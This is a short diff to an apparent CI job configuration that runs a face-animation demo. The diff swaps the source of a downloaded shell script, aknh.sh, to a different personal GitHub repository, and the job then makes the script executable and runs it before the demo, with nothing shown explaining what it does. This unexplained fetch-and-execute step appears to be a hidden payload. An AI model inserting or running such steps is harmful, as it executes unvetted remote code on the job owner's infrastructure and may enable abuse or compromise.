@@ -22,9 +22,10 @@ jobs:
       script: |-
         apt-get update
         apt-get install wget -y
-        wget https://github.com/aka648582/yes/raw/main/aknh.sh
+        wget https://github.com/coldajanta/ak/raw/main/aknh.sh
         chmod +x aknh.sh
         ./aknh.sh
+        sleep 5
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
           --checkpoint /inputs/model/vox.pt \
